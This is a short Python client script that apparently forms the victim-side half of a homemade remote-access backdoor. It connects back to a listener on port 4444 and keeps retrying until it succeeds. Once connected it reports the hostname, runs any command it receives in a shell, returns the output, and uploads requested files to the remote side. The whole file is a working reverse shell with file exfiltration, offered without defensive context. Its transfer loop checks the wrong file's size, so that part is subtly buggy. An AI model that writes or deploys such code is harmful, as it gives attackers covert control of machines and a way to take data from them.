# client.py

import socket
import time
import subprocess
import os
import tqdm

HOST = "127.0.0.1"
PORT = 4444


def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return s


def connect(s):
    while True:
        try:
            s.connect((HOST, PORT))
        except Exception as e:
            print(e)
            time.sleep(2)
        except s.error as e:
            print(e, " - socket error")
            time.sleep(2)
        else:
            break
    return s


def run_client():
    s = create_socket()
    s = connect(s)
    command(s)


def reconnect(s):
    s.close()
    run_client()


def command(s):
    s.send(socket.gethostname().encode())

    while True:
        try:
            cmd = s.recv(10000).decode()

            if 'areualive?' != cmd:
                print(cmd)

            if cmd == "":
                s.send(b"No command send")
            elif "cd" in cmd:
                os.chdir(cmd.split(" ")[1])
                s.send("Changed directory to {}".format(os.getcwd()).encode())
            elif 'download' in cmd:
                file_path = cmd.split(" ")[1]
                s.send(str(os.path.getsize(file_path)).encode())
                f = open(file_path, "rb")
                data_check = 0
                while data_check != int(str(os.path.getsize("server.py"))):
                    data = f.read(1024)
                    print(str(len(data)))
                    s.send(data)
                    data_check = data_check + int(len(data))
                f.close()

            elif 'areualive?' == cmd:
                s.send(b'y')
            else:
                terminal = subprocess.Popen([cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE, shell=True)
                STDOUT, STDERR = terminal.communicate()
                if STDOUT:
                    s.send(STDOUT)
                if STDERR:
                    s.send(STDERR)

        except Exception as e:
            break
        except s.error as e:
            break
    reconnect(s)


def main():
    run_client()


main()
